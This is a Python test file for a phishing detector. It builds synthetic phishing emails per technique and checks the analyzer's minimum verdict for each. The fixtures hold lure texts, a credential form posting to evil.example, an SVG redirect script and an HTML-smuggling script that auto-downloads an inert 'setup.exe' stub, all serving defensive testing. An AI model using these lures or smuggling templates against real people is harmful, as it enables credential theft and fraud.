"""One realistic email per major phishing technique. Each must reach at least its minimum verdict.

    python -X utf8 tests/archetypes.py          (also run by test_regressions)
"""
import io
import struct
import sys
import tempfile
import zipfile
from email.message import EmailMessage
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from phishcheck import analyzer, parser  # noqa: E402

RANK = {"Low": 0, "Medium": 1, "High": 2}
AUTH_FAIL = "mx.example.com; spf=fail smtp.mailfrom=evil.example; dkim=none; dmarc=fail"


def mail(sender, subject, text, html=None, reply_to=None, auth=None, attachments=()):
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = sender, "victim@example.org", subject
    m["Date"] = "Mon, 12 Oct 2026 09:30:00 +0000"
    if reply_to:
        m["Reply-To"] = reply_to
    if auth:
        m["Authentication-Results"] = auth
    m.set_content(text)
    if html:
        m.add_alternative(html, subtype="html")
    for name, data in attachments:
        m.add_attachment(data, maintype="application", subtype="octet-stream", filename=name)
    return bytes(m)


def make_zip(entries, encrypted=False):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in entries:
            z.writestr(name, data)
    raw = bytearray(buf.getvalue())
    if encrypted:  # set the "encrypted" flag bit in every local + central header
        for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            i = raw.find(sig)
            while i >= 0:
                raw[i + off] |= 1
                i = raw.find(sig, i + 4)
    return bytes(raw)


def docm():
    return make_zip([("[Content_Types].xml", "<Types/>"), ("word/document.xml", "<w/>"), ("word/vbaProject.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 200)])


HTML_SMUGGLE = (b"<html><body><script>var d=atob('TVqQAAMAAAAEAAAA');var b=new Blob([d],{type:'application/octet-stream'});"
                b"var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='setup.exe';a.click();</script></body></html>")
HTML_LOGIN = b"<html><body><form action='http://evil.example/p' method=post><input name=u><input type=password name=p></form></body></html>"
SVG_SCRIPT = b"<svg xmlns='http://www.w3.org/2000/svg'><script>location='http://evil.example/'</script></svg>"
ONENOTE = b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3" + b"\x00" * 300

ARCHETYPES = {
    # name: (minimum verdict, raw email)
    "credential_harvest_lookalike": ("High", mail(
        "Microsoft 365 Security <no-reply@micros0ft-365.top>", "Action required: verify your account immediately",
        "Your account will be suspended. Verify your account within 24 hours: http://micros0ft-365.top/login",
        '<p>Unusual activity detected. <a href="http://micros0ft-365.top/login">https://login.microsoftonline.com</a></p>',
        auth=AUTH_FAIL)),
    "invoice_with_macro_doc": ("Medium", mail(
        "Accounts Payable <billing.dept@gmail.com>", "Invoice 4421 overdue", "Please see attached invoice 4421, payment overdue.",
        attachments=[("Invoice_4421.docm", docm())])),
    "html_smuggling_attachment": ("Medium", mail(
        "Docs <share@docs-portal.xyz>", "Statement attached", "Open the attachment to view your statement.",
        attachments=[("Statement.html", HTML_SMUGGLE)])),
    "html_fake_login_form": ("Medium", mail(
        "Payroll <hr@company-payroll.top>", "Remittance advice", "See attached remittance.",
        attachments=[("Remittance.htm", HTML_LOGIN)])),
    "svg_with_script": ("Medium", mail(
        "Shared <noreply@filesend.click>", "Photo shared with you", "Open the image.", attachments=[("photo.svg", SVG_SCRIPT)])),
    "double_extension_exe": ("High", mail(
        "Scanner <scan@office-copier.example>", "Scan_0042", "Your scan is attached.",
        attachments=[("Scan_0042.pdf.exe", b"MZ" + b"\x90" * 200)])),
    "iso_lure": ("Medium", mail(
        "Legal <legal@law-firm-docs.example>", "Court documents", "Documents attached.", attachments=[("Documents.iso", b"CD001" + b"\x00" * 100)])),
    "lnk_inside_zip": ("Medium", mail(
        "Shipping <track@parcel-notice.example>", "Shipping label", "Label attached.",
        attachments=[("label.zip", make_zip([("Invoice.pdf.lnk", b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 100)]))])),
    "password_protected_zip": ("Medium", mail(
        "HR <hr@company-benefits.example>", "Updated benefits (password 1234)", "Password for the archive is 1234.",
        attachments=[("benefits.zip", make_zip([("benefits.xlsx", b"x" * 500)], encrypted=True))])),
    "onenote_attachment": ("Medium", mail(
        "IT <it@helpdesk-portal.top>", "Action needed", "Open the attached notebook.", attachments=[("Instructions.one", ONENOTE)])),
    "ceo_fraud_gift_cards": ("Medium", mail(
        "Jordan Lee (CEO) <jordan.lee.ceo@gmail.com>", "Urgent: are you available?",
        "I need a wire transfer processed today and some gift cards. Reply urgently, do not call me.", auth="mx; spf=none; dkim=none; dmarc=none")),
    "bec_reply_to_spoof": ("Medium", mail(
        "Sarah Kim <sarah.kim@company.com>", "Quick task", "Can you handle a payment for me? Reply to this email.",
        reply_to="sarah.kim.cfo@outlook.com", auth="mx; spf=none; dkim=none; dmarc=none")),
    "delivery_fee_smishing": ("Medium", mail(
        "DHL Delivery <info@dhl-parcel-track.xyz>", "Your parcel could not be delivered",
        "Pay the customs fee to redeliver your parcel: http://bit.ly/3xYzAbC",
        '<p><a href="http://bit.ly/3xYzAbC">Pay customs fee</a></p>', auth=AUTH_FAIL)),
    "docusign_obfuscated_name": ("High", mail(
        "D̲o̲c̲u̲S̲i̲g̲n̲ Notification <ib@secure-docs-review.example>", "A document is ready for your signature",
        "Review document: http://docusign-secure.example/review",
        '<p><a href="http://docusign-secure.example/review">REVIEW DOCUMENT</a></p>', auth=AUTH_FAIL)),
    "crypto_airdrop": ("Medium", mail(
        "Lido DAO <noreply@itariannotifications.com>", "Lido Community Rewards",
        "Claim your tokens in the airdrop. Connect your wallet: https://lido-airdrop.tcgprices.co.uk/claim",
        '<p><a href="https://lido-airdrop.tcgprices.co.uk/claim">Claim your tokens</a> connect your wallet</p>',
        auth="mx; spf=pass; dkim=pass; dmarc=pass")),
    "portuguese_tax_lure": ("Medium", mail(
        "Receita Federal <atendimento@gov-br-receita.top>", "Conta bloqueada: regularize sua situacao",
        "Sua conta foi suspensa. Regularize agora: http://gov-br-receita.top/cpf", auth=AUTH_FAIL)),
    "ip_address_login": ("High", mail(
        "IT Support <support@example.org>", "Password expires today", "Reset your password: http://192.168.4.5/owa/login",
        '<p><a href="http://192.168.4.5/owa/login">https://mail.example.org/owa</a></p>', auth=AUTH_FAIL)),
    "at_sign_url_trick": ("Medium", mail(
        "Google <no-reply@accounts-google.example>", "Security alert", "Check activity: https://www.google.com-signin@evil-host.top/a",
        auth=AUTH_FAIL)),
    "german_account_locked": ("Medium", mail(
        "PayPal Service <service@paypal-konto.example>", "Ihr Konto wurde gesperrt",
        "Bestaetigen Sie Ihr Konto: http://paypal-konto.example/login", auth=AUTH_FAIL)),
}


def run(verbose=True):
    misses = []
    with tempfile.TemporaryDirectory() as td:
        for name, (want, raw) in ARCHETYPES.items():
            p = Path(td) / f"{name}.eml"
            p.write_bytes(raw)
            r = analyzer.analyze(parser.parse_file(str(p)))
            ok = RANK[r.verdict] >= RANK[want]
            if verbose:
                print(f"  {'OK  ' if ok else 'MISS'} {name:32} want>={want:6} got {r.verdict:6} {r.score:3}")
            if not ok:
                misses.append(name)
                if verbose:
                    for f in r.findings[:6]:
                        print(f"         {f.severity:6} +{f.points} {f.message[:90]}")
    return misses


if __name__ == "__main__":
    print(f"=== PHISHING ARCHETYPES ({len(ARCHETYPES)}) ===")
    missed = run()
    print(f"\n{len(ARCHETYPES) - len(missed)}/{len(ARCHETYPES)} detected at the required level")
    sys.exit(1 if missed else 0)
